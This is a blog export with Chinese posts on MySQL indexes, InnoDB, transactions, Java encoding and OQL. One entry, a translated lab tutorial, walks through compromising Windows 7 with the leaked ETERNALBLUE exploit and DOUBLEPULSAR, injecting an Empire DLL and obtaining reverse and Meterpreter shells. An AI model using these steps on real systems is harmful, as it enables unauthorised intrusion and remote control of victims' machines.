<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">protected void doGet(HttpServletRequest request, HttpServletResponse</span><br><span class="line">response) throws ServletException, IOException &#123;</span><br><span class="line">    String fileName = getDecodeParameter(request,&quot;fileName&quot;);</span><br><span class="line">    String userName = getDecodeParameter(request, &quot;username&quot;);</span><br><span class="line">    response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment; filename=\&quot;&quot; +</span><br><span class="line">    URLEncoder.encode(fileName,&quot;utf-8&quot;) + &quot;\&quot;;userName=\&quot;&quot; +</span><br><span class="line">    URLEncoder.encode(userName,&quot;utf-8&quot;) + &quot;\&quot;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="DataBase-operation"><a href="#DataBase-operation" class="headerlink" title="DataBase operation"></a>DataBase operation</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2018/01/23/messy-code/image015.jpg"
                      class="" title="database messy code"
                >

<p>Bridge: Unicode</p>
<p>Server database, client system, client environment varible.</p>
<p>Create databse using utf-8, and SQL NCHAR could solve the multi-language issues.</p>
<p><a class="link"   href="https://www.ibm.com/developerworks/cn/web/wa-lo-ecoding-response-problem/index.html" >Deep in analyzing the web request<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> </p>
<p><a class="link"   href="http://www.faqs.org/rfcs/rfc3986.html" >Referring RFC<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.ibm.com/developerworks/cn/java/j-lo-chinesecoding/index.html" >Deep in analyzing java cnEncode<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="http://www.unicode.org/charts/" >Unicode Encode standard<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>编码</category>
      </categories>
      <tags>
        <tag>ANSI</tag>
        <tag>ASCII</tag>
        <tag>decode</tag>
        <tag>encode</tag>
        <tag>ISO-8859-1</tag>
        <tag>messy code</tag>
      </tags>
  </entry>
  <entry>
    <title>(转) Mysql 索引</title>
    <url>/2020/08/01/mysql-index/</url>
    <content><![CDATA[<h3 id="索引为什么采用-B-tree"><a href="#索引为什么采用-B-tree" class="headerlink" title="索引为什么采用 B+ tree"></a>索引为什么采用 B+ tree</h3><ol>
<li><p>Hash不支持范围查询</p>
</li>
<li><p>二叉树树高很高，只有B树跟B+有的一比。</p>
</li>
<li><p>B树一个节点可以存储多个元素，相对于完全平衡二叉树整体的树高降低了，磁盘IO效率提高了。</p>
</li>
<li><p>而B+树是B树的升级版，只是把非叶子节点冗余一下，这么做的好处是为了提高范围查找的效率。提高了的原因也无非是会有指针指向下一个节点的叶子节点。</p>
</li>
</ol>
<h4 id="explain"><a href="#explain" class="headerlink" title="explain"></a>explain</h4><h5 id="索引命中"><a href="#索引命中" class="headerlink" title="索引命中"></a>索引命中</h5><p>id is null 和 id &#x3D; 1 都能命中索引 （除此之外的大多都不能命中索引，比如 负向 !&#x3D; 比较 &gt; &lt; 范围 between 等） 但是 id is null or id &#x3D; 1 还是触发 全表扫描(type&#x3D;all<br>) 但如果 or 改为 union 那么又能命中索引了</p>
<h5 id="各字段解释"><a href="#各字段解释" class="headerlink" title="各字段解释"></a>各字段解释</h5><ol>
<li><p>explain: type (the join type) 常见值</p>
<ul>
<li>system：系统表或常量表<ul>
<li>比如从系统库mysql的系统表time_zone里查询数据，这些数据已经加载到内存里，不需要进行磁盘IO；</li>
<li>explain select * from (select * from user where id&#x3D;1) tmp; 以及这种 子层 const 返回后对外层而言也是 system</li>
</ul>
</li>
<li>const：常量连接；<ul>
<li>命中主键(primary key)或者唯一(unique)索引；</li>
<li>被连接的部分是一个常量(const)值；</li>
</ul>
</li>
<li>eq_ref：主键索引(primary key)或者非空唯一索引(unique not null)等值扫描；</li>
<li>ref：非主键非唯一索引等值扫描；</li>
<li>range：范围扫描；</li>
<li>index：索引树扫描；</li>
<li>all：全表扫描(full table scan)；</li>
</ul>
</li>
<li><p>B + 索引如何加速查询</p>
<ol>
<li><p>表在创建时一定会组织一次聚簇索引，可能时根据主键，没有的话看唯一键，还没有的话就自己生成个rowid，无论如何都会组织聚簇索引（其B+ 的叶子上对应着行的完整数据），这是其他索引关联全量查的基本。</p>
</li>
<li><p>现在假设说根据其他字段键一个索引，那么就会基于该索引字段创建一个新的B+树，其非叶子节点上仅包含索引字段，而其叶子节点上会包索引字段和前面提到的能够关联聚簇索引的字段，这样走完其他索引却也想要查全量数据的时候就会先去基于这个仅包含索引字段与关联字段数据（行信息不完整）的叶子节点定位一次，然后关联到聚簇索引上拿到全量的数据。这种索引称为二级索引，也叫辅助索引。</p>
</li>
<li><p>复合索引，索引涉及多个字段，则会按照索引建立时字段的顺序进行先后排序，也就是前面的字段相同时，会按照后面的字段进行排序，其他和上面大致相同，也就是非叶子节点包含索引字段，叶子节点包含索引字段和聚簇索引的关联字段。</p>
 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/08/01/mysql-index/b+tree-basic.png"
                      class="" title="联合索引例图"
                >

<ul>
<li><p>这里来推下最左前缀的原理：有 index(a,b)， <code>sql select * from t where b = 3</code>，显然不走索引，因为按照 a 先排序后的 b是分散在不同的索引节点上的，只能跑全索引(type&#x3D;index)搜。</p>
</li>
<li><p>其实这还能解释为啥 <code>like %</code> 前缀不行，因为排序是按前缀进行字典序排序的，<code>%</code> 不放在前面才能按序查找</p>
</li>
<li><p>这样看来其实只将B+树看作一种加快搜索的二分算法，那么索引其实还是相当于一个组织多字段排序数组的结果。</p>
</li>
</ul>
</li>
</ol>
</li>
</ol>
<h4 id="索引基本数据结构"><a href="#索引基本数据结构" class="headerlink" title="索引基本数据结构"></a>索引基本数据结构</h4><h5 id="页"><a href="#页" class="headerlink" title="页"></a>页</h5><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/08/01/mysql-index/innodb-page.png"
                      class="" title="页图"
                >

<ol>
<li>页可以组织成双向链表</li>
<li>每个页中的记录可以组织成单向链表</li>
<li>记录有对应的页目录（二分查找）作为索引，方便加快速度定位 </li>
<li>以其他列(非主键)作为搜索条件：只能从最小记录开始依次遍历单链表中的每条记录</li>
</ol>
<h3 id="索引使用"><a href="#索引使用" class="headerlink" title="索引使用"></a>索引使用</h3><h4 id="什么是三星索引"><a href="#什么是三星索引" class="headerlink" title="什么是三星索引"></a>什么是三星索引</h4><p>第一颗星：WHERE 后面参与查询的列可以组成了单列索引或联合索引</p>
<p>第二颗星：避免排序，即如果 SQL 语句中出现 order by colulmn，那么取出的结果集就已经是按照 column 排序好的，不需要再生成临时表</p>
<p>第三颗星：SELECT 对应的列应该尽量是索引列，即尽量避免回表查询。</p>
<h4 id=""><a href="#" class="headerlink" title=""></a></h4>]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>Mysql</tag>
        <tag>Database</tag>
        <tag>Sql optimization</tag>
        <tag>index</tag>
        <tag>B + tree</tag>
      </tags>
  </entry>
  <entry>
    <title>Mysql InnoDB</title>
    <url>/2020/08/06/mysql-innodb%5B0%5D/</url>
    <content><![CDATA[<h2 id="Mysql-InnoDB"><a href="#Mysql-InnoDB" class="headerlink" title="Mysql InnoDB"></a>Mysql InnoDB</h2>

<h3 id="InnoDB-In-Memory-Structures"><a href="#InnoDB-In-Memory-Structures" class="headerlink" title="InnoDB In-Memory Structures"></a>InnoDB In-Memory Structures</h3><p>1、Buffer Pool: 未落盘前数据的缓存位置</p>
<pre><code>- LRU，链表
</code></pre>
<ol start="2">
<li><p>Change Buffer: 要修改数据不在内存中时对应页修改的记录位置</p>
<ul>
<li><p>记录到 Change Buffer时，同时记录 redo log，然后再慢慢把数据 load 到内存，load 过来后，再把 Change Buffer 里记录的修改，应用到内存（Buffer<br> Pool）中，这个动作叫做 merge；而把内存数据刷到磁盘的动作，叫 purge：</p>
</li>
<li><p>change buffer 只应用于二级索引(辅助索引)，因为聚簇索引是唯一的，即每次插入修改都检查是否已经存在，因此不需要change buffer</p>
</li>
</ul>
</li>
<li><p>Adaptive Hash Index</p>
<ul>
<li>自适应哈希索引」（Adaptive Hash Index）。自适应，顾名思义，MySQL 会自动评估使用自适应索引是否值得，如果观察到建立哈希索引可以提升速度，则建立。</li>
</ul>
</li>
<li><p>Log Buffer 里的 redo log，会被刷到磁盘里</p>
</li>
</ol>
<h3 id="Operating-System-Cache"><a href="#Operating-System-Cache" class="headerlink" title="Operating System Cache"></a>Operating System Cache</h3><h3 id="InnoDB-On-Disk-Structures"><a href="#InnoDB-On-Disk-Structures" class="headerlink" title="InnoDB On-Disk Structures"></a>InnoDB On-Disk Structures</h3><ol>
<li><p>表空间（Tablespaces）</p>
<ul>
<li><p>The System Tablespace</p>
</li>
<li><p>File-Per-Table Tablespaces</p>
</li>
<li><p>General Tablespace</p>
</li>
<li><p>Undo Tablespaces</p>
</li>
<li><p>Temporary Tablespaces</p>
</li>
</ul>
</li>
</ol>
<p>2、Doublewrite Buffer</p>
<pre><code>- MySQL 在刷数据到磁盘之前，要先把数据写到另外一个地方，也就是 Doublewrite Buffer，写完后，再开始写磁盘。Doublewrite Buffer 可以理解为是一个备份（recovery），万一真的发生 crash，就可以利用 Doublewrite Buffer 来修复磁盘里的数据。
</code></pre>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>Mysql</tag>
        <tag>InnoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>(转)Mysql Transaction</title>
    <url>/2020/07/29/mysql-transaction/</url>
    <content><![CDATA[<h2 id="MySql-Transaction"><a href="#MySql-Transaction" class="headerlink" title="MySql Transaction"></a>MySql Transaction</h2><h3 id="事务如何保证"><a href="#事务如何保证" class="headerlink" title="事务如何保证"></a>事务如何保证</h3><ol>
<li>原子性： undo log<ul>
<li><p>binlog记载的是update&#x2F;delete&#x2F;insert这样的SQL语句，而redo log记载的是物理修改的内容（xxxx页修改了xxx）。即redo log 记录的是数据的物理变化，binlog 记录的是数据的逻辑变化。</p>
</li>
<li><p>binlog的作用是复制和恢复而生的。</p>
</li>
<li><p>主从服务器需要保持数据的一致性，通过binlog来同步数据。</p>
</li>
<li><p>如果整个数据库的数据都被删除了，binlog存储着所有的数据变更情况，那么可以通过binlog来对数据进行恢复。而redo log 存储的是物理数据的变更，如果我们内存的数据已经刷到了磁盘了，那redo log</p>
</li>
</ul>
</li>
</ol>
<p>的数据就无效了。所以redo log不会存储着历史所有数据的变更，文件的内容会被覆盖的</p>
<ol start="2">
<li><p>持久性： redo log</p>
<ul>
<li><p>redo log事务开始的时候，就开始记录每次的变更信息，而binlog是在事务提交的时候才记录</p>
</li>
<li><p>如果写redo log失败了，那我们就认为这次事务有问题，回滚，不再写binlog。</p>
</li>
<li><p>如果写redo log成功了，写binlog，写binlog写一半了，但失败了怎么办？我们还是会对这次的事务回滚，将无效的binlog给删除（因为binlog会影响从库的数据，所以需要做删除操作）</p>
</li>
<li><p>如果写redo log和binlog都成功了，那这次算是事务才会真正成功。</p>
</li>
<li><p>简单来说：MySQL需要保证redo log和binlog的数据是一致的，如果不一致，那就乱套了。</p>
</li>
</ul>
</li>
<li><p>两阶段提交</p>
<ul>
<li><p>阶段1：InnoDBredo log 写盘，InnoDB 事务进入 prepare 状态</p>
</li>
<li><p>阶段2：binlog 写盘，InooDB 事务进入 commit 状态</p>
</li>
<li><p>每个事务binlog的末尾，会记录一个 XID event，标志着事务是否提交成功，也就是说，恢复过程中，binlog 最后一个 XID event 之后的内容都应该被 purge。</p>
</li>
</ul>
</li>
<li><p>undo_log: 回滚和多版本控制(MVCC)</p>
<ul>
<li><p>undo log主要存储的也是逻辑日志，比如我们要insert一条数据了，那undo log会记录的一条对应的delete日志。我们要update一条记录时，它会记录一条对应相反的update记录(原子性保证的前提)</p>
</li>
<li><p>undo log存储着修改之前的数据，相当于一个前版本，MVCC实现的是读写不阻塞，读的时候只要返回前一个版本的数据就行了。</p>
</li>
</ul>
</li>
</ol>
<h4 id="关于锁"><a href="#关于锁" class="headerlink" title="关于锁"></a>关于锁</h4><h4 id="锁协议"><a href="#锁协议" class="headerlink" title="锁协议"></a>锁协议</h4><ul>
<li>无法像应用一样预知用哪些数据，直接锁对应的数据即可，因而数据库提出了两段锁协议</li>
</ul>
<ol>
<li>加锁阶段：在该阶段可以进行加锁操作。在对任何数据进行读操作之前要申请并获得S锁（共享锁，其它事务可以继续加共享锁，但不能加排它锁），在进行写操作之前要申请并获得X<br>锁（排它锁，其它事务不能再获得任何锁）。加锁不成功，则事务进入等待状态，直到加锁成功才继续执行。</li>
<li>解锁阶段：当事务释放了一个封锁以后，事务进入解锁阶段，在该阶段只能进行解锁操作不能再进行加锁操作。</li>
</ol>
<h4 id="加锁方式"><a href="#加锁方式" class="headerlink" title="加锁方式"></a>加锁方式</h4><ol>
<li><p>读提交：读不加锁，写加锁</p>
<ul>
<li><p>如果一个条件无法通过索引快速过滤，存储引擎层面就会将所有记录加锁后返回，再由MySQL Server层进行过滤</p>
</li>
<li><p>实际改进：在MySQL Server过滤条件，发现不满足后，会调用unlock_row<br> 方法，把不满足条件的记录释放锁 (违背了二段锁协议的约束)。这样做，保证了最后只会持有满足条件记录上的锁，但是每条记录的加锁操作还是不能省略的。</p>
</li>
</ul>
</li>
<li><p>不可重复读</p>
<ul>
<li><p>悲观锁：事务开启时就锁数据，锁数据期间别的无法修改，自然看到的就一直是对应的数据了，此方法低效且无法处理插入这种幻读的情况。</p>
</li>
<li><p>所以采取了乐观锁 ：MVCC 这种模式</p>
</li>
</ul>
</li>
</ol>
<h4 id="MVCC"><a href="#MVCC" class="headerlink" title="MVCC"></a>MVCC</h4><ul>
<li><p>SELECT时，读取创建版本号&lt;&#x3D;当前事务版本号，删除版本号为空或&gt;当前事务版本号。</p>
</li>
<li><p>INSERT时，保存当前事务版本号为行的创建版本号</p>
</li>
<li><p>DELETE时，保存当前事务版本号为行的删除版本号</p>
</li>
<li><p>UPDATE时，插入一条新纪录，保存当前事务版本号为行创建版本号，同时保存当前事务版本号到原来删除的行</p>
<ul>
<li><p>Mysql 的 可重复读解决了 幻读的 <strong>读</strong> 问题，因为幻读插入的数据版本号高于当前版本，因此不会读到。但这也意味着读的不是最新的数据，因此称为快照读，与之对应的就是锁数据来保持当前版本读，称为当前读。</p>
</li>
<li><p>为了解决当前读中的幻读 <strong>写</strong> 问题，MySQL事务使用了Next-Key锁。Next-Key锁是行锁和GAP（间隙锁）的合并。RR级别中，事务A在update后加锁，事务B无法插入新数据，这样事务A在update<br>  前后读的数据保持一致，避免了幻读。这个锁，就是Gap锁，所谓Gap锁就是按索引字段将修改数据附近的区间进行加锁，进而保证不可插入，但弊端就在于对没有索引的字段会锁全表，而有索引的字段在没有命中数据的情况下，仍然回对该区间加锁</p>
</li>
</ul>
</li>
</ul>
<h4 id="加锁只针对当前读，快照读不需要加锁"><a href="#加锁只针对当前读，快照读不需要加锁" class="headerlink" title="加锁只针对当前读，快照读不需要加锁"></a>加锁只针对当前读，快照读不需要加锁</h4><p>读锁和写锁都是最基本的锁模式，它们的概念也比较容易理解。<br>读锁，又称共享锁（Share locks，简称 S 锁），加了读锁的记录，所有的事务都可以读取，但是不能修改，并且可同时有多个事务对记录加读锁。写锁，又称排他锁（Exclusive locks，简称 X 锁），或独占锁，对记录加了排他锁之后，只有拥有该锁的事务可以读取和修改，其他事务都不可以读取和修改，并且同一时间只能有一个事务加写锁。（注意：这里说的读都是当前读，快照读是无需加锁的，记录上无论有没有锁，都可以快照读）</p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>Mysql</tag>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
    <title>NSA tools</title>
    <url>/2017/08/01/nsa-tools/</url>
    <content><![CDATA[<p>标签： <code>injection</code> <code>security</code> <code>python</code> <code>shadowbroker</code> <code>tool</code></p>
<hr>
<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a><strong>介绍</strong></h3><p>去年八月，ShadowBroker 发布了一套从NSA那偷来的工具，一个GitHub库对此fork了一份： <a class="link"   href="https://github.com/misterch0c/shadowbroker" >工具库<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 在这份文档中，我们将重点转移到ETERNALBLUE上（针对win和插件DOUBLEPULSAR）。为了使这波操作离开要命的敲代码。我们会使用FUZZBUUNCH， 这可是NSA他娘的意大利炮。</p>
<h4 id="为啥选Eternalblue-和-DoublePulsar"><a href="#为啥选Eternalblue-和-DoublePulsar" class="headerlink" title="为啥选Eternalblue 和 DoublePulsar"></a><strong>为啥选Eternalblue 和 DoublePulsar</strong></h4><p>在暗影众多的 win爆 工具中， Eternalblue 是 唯一一个可以用来攻击win7 和 win server 2008 而 <strong>不需要权限</strong> 的。 除此之外，我们可以用插件 DOUBLEPLUSAR 来注入到目标远程端一个恶意的DLL。 记住了小伙鸡， 我们可以注入任何我们想要的 DLL; 我们将用 Empire 创建一个恶意的DLL 来 获取一个 反向连接（从目标鸡到攻击鸡）</p>
<h4 id="安装部分"><a href="#安装部分" class="headerlink" title="安装部分"></a><strong>安装部分</strong></h4><p>我们需要三台机器在同一个当地网络（LAN, local area network） 1. 目标鸡（Win 7&#x2F;2008） 一只鸡配备了 win7&#x2F;2008 可以用来当目标鸡。然后这只鸡我们只要知道它的IP就行了。 2. 攻击公鸡 这只鸡要配备上我们的子弹， 首先它得是 winxp， 然后就是 py2.6， 然后就是你在win鸡上安装 pyWin32 v2.12 这个玩意才跑得动。 3. 攻击母鸡 最后了，我们只需要在找个linux鸡岸上Empire 和 Metasploit 工具。 <a class="link"   href="https://github.com/EmpireProject/Empire" >Empire<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> <a class="link"   href="https://www.rapid7.com/products/metasploit/download/" >Metasploit<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 当然，如果你没有神奇的海螺，为啥不kali kali呢？ 这次计划，我们配备了这样的鸡 - win7 - 192.168.1.109 -&gt; 目标鸡 - winxp - 192.168.1.108 -&gt; 有FUZZBUNCH的攻击公鸡 - LInux （Debian jessie ）- 192.68.1.105 -&gt; 有Empire和 metasploit的攻击母鸡</p>
<h3 id="安装-FuzzBunch"><a href="#安装-FuzzBunch" class="headerlink" title="安装 FuzzBunch"></a><strong>安装 FuzzBunch</strong></h3><p><a class="link"   href="https://www.python.org/download/releases/2.6/" >Python 2.6<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>(环境变量) <a class="link"   href="https://sourceforge.net/projects/pywin32/files/pywin32/Build%20212/" >PyWin32 v2.12<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> <a class="link"   href="https://notepad-plus-plus.org/download/" >Notepad++<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> (notepad++) 上面这三个下载下来，一顿next，Accept干下来就老实了。</p>
<ol>
<li><p>现在打开那个暗影那个工具包， 找到 win下 那个fb.py 想直接跑不存在的，你这找到fb的72行， 注释了他， 因为你电脑里没这个字典 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20170719001044465?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM1OTU3MTg4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"
                      alt="directory"
                ></p>
</li>
<li><p>然后还得改一个Fuzzbunch.xml 的文件（也是这个目录） 然后把19， 24 行的目录代码改成你电脑里有的俩，或者自己照着创建也行（那你还真可爱） <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20170719001151033?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM1OTU3MTg4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"
                      alt="file"
                ></p>
</li>
<li><p>好了弟兄们， 操练起来， 找个cmd 把这个fb跑起来吧 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20170719001237005?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM1OTU3MTg4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"
                      alt="fb.py"
                ></p>
<ul>
<li>先把目标鸡的ip输进去</li>
<li>再把自己的ip输进去（攻击公鸡）</li>
<li>给你这个计划起个鸡**名吧</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20170719001418453?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM1OTU3MTg4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"
                      alt="Fuzznunch"
                ></p>
</li>
</ol>
<h3 id="用EternalBlue-发功，-攻击目标鸡"><a href="#用EternalBlue-发功，-攻击目标鸡" class="headerlink" title="用EternalBlue 发功， 攻击目标鸡"></a><strong>用EternalBlue 发功， 攻击目标鸡</strong></h3><p>和metasploit差不多， 先 use 一下 然后剩下的都按默认来—–除了！mode要设置为1 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20170719001601672?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM1OTU3MTg4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"
                      alt="mode"
                > 运气好的话，这枚意大利炮就打过去了 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20170719001634860?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM1OTU3MTg4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"
                      alt="EternalBlue"
                ></p>
<h3 id="用Empire-做一个-恶意的-DLL"><a href="#用Empire-做一个-恶意的-DLL" class="headerlink" title="用Empire 做一个 恶意的 DLL"></a><strong>用Empire 做一个 恶意的 DLL</strong></h3><p>我们创建一个DLL用来进行远程注入到刚才那只被EternalBlue感染了的鸡，那么怎么创建呢？ 找一个安了Empire的linux 1. 开一个监听端口， 这样能收反向连接 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20170719001832022?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM1OTU3MTg4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"
                      alt="reverse connection"
                > 2. 创建这个DLL，把他放在公鸡上，这样FUZZBUNCH就可以妙用它 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20170719001935162?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM1OTU3MTg4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"
                      alt="DLL"
                ></p>
<h3 id="通过DoublePulsar进行注入DLL"><a href="#通过DoublePulsar进行注入DLL" class="headerlink" title="通过DoublePulsar进行注入DLL"></a><strong>通过DoublePulsar进行注入DLL</strong></h3><p>回到 XP公鸡， 我们这次在FUZZBUNCH 上 use DoublePulsar，除了下面的这些参数，其他的按默认来 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20170719001957459?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM1OTU3MTg4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"
                      alt="DoublePulsar"
                ><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20170719002049679?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM1OTU3MTg4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"
                      alt="configDoublePulsar"
                ><strong>现在进入到重要环节了，把那个dll的路径输上</strong> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20170719002200052?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM1OTU3MTg4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"
                      alt="dllPath"
                > 最后，我们run一下这个 DOUBLEPULSAR <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20170719002233193?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM1OTU3MTg4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"
                      alt="DOUBLEPULSAR"
                > 如果这只公鸡够骚， 那么。。。嘿嘿嘿 Doublepulsar Succeded！</p>
<h3 id="得到-Empire-Session"><a href="#得到-Empire-Session" class="headerlink" title="得到 Empire Session"></a><strong>得到 Empire Session</strong></h3><p>上一步成功后， 我们的母鸡也会得到一个反向连接 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20170719002302236?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM1OTU3MTg4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"
                      alt="reverse connection"
                > 以上就是全部内容，Complete！</p>
<h3 id="合到-Meterpreter上"><a href="#合到-Meterpreter上" class="headerlink" title="合到 Meterpreter上"></a><strong>合到 Meterpreter上</strong></h3><p>事实上上面的步骤可以简化， 这就需要 meterpreter了 1. 开一个端口监听，payload:windows&#x2F;meterpreter&#x2F;reverse_https 2. 在 Empire 中， 运行 这个 code_execution 模块来注入meterpreter模块的代码 3. 获取 meterpreter session <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20170719002442701?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM1OTU3MTg4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"
                      alt="Meterpreter"
                ></p>
<h3 id="Remark"><a href="#Remark" class="headerlink" title="Remark"></a><strong>Remark</strong></h3><p>Finally, we’ve obtained a Meterpreter shell on a Windows 7 SP1 x64 without needing for user interaction, just with knowing its IP. This reminded me of the ease with which access to a Windows XP is obtained through ms08_067. A curious detail is that, according to the timestamp of ETERNALBLUE, the NSA had this since 2011… <strong>还有大佬们：</strong> For helping me to write this paper: Cristian Borghello (@crisborghe &#x2F; @seguinfo). For being by my side whenever I need it: Claudio Caracciolo (@holesec). Luciano Martins (@clucianomartins). Ezequiel Sallis (@simubucks). Mateo Martinez (@MateoMartinezOK). Sol (@0zz4n5). @DragonJar || @ekoparty || “Las Pibas de Infosec”</p>
<hr>
<p>Sheila A. Berta - @UnaPibaGeek.</p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>exploit</tag>
        <tag>linux</tag>
        <tag>NSA</tag>
      </tags>
  </entry>
  <entry>
    <title>OQL</title>
    <url>/2020/09/26/oql/</url>
    <content><![CDATA[<h1 id="JVM-Object-Query-Language"><a href="#JVM-Object-Query-Language" class="headerlink" title="JVM Object Query Language"></a>JVM Object Query Language</h1><p><a class="link"   href="http://cr.openjdk.java.net/~sundar/8022483/webrev.01/raw_files/new/src/share/classes/com/sun/tools/hat/resources/oqlhelp.html" >参考链接<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>简单说就是 java heap 信息的查询语言。<br>原本的小工具 hat 其实已经够用了，但是为了增加点灵活性，所以引入了 oql 方便查询。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &lt;JavaScript expression to select&gt;</span><br><span class="line">        [ from [instanceof] &lt;class name&gt; &lt;identifier&gt;</span><br><span class="line">        [ where &lt;JavaScript boolean expression to filter&gt; ] ]</span><br></pre></td></tr></table></figure></div>

<p>上面的表达式大致介绍下：</p>
<ul>
<li><p><code>&lt;class name&gt;</code>  标准Java类名（例如：<code>java.net.URL</code>）或数组类名。<br> <code>[C</code>是字符数组名称，<code>[Ljava.io.File;</code> 是<code>java.io.File []</code>的名称，依此类推。<br> 要注意全限定描述的类名在运行时并不总是唯一地标识Java类，毕竟可能用着不一样的 <code>classloader</code>。<br> 因此，只是允许将类名作为类对象的 <code>identifier</code> 字符串。</p>
</li>
<li><p><code>[instanceof]</code> 可选，选了就连子类一同查，否则只查对应的类</p>
</li>
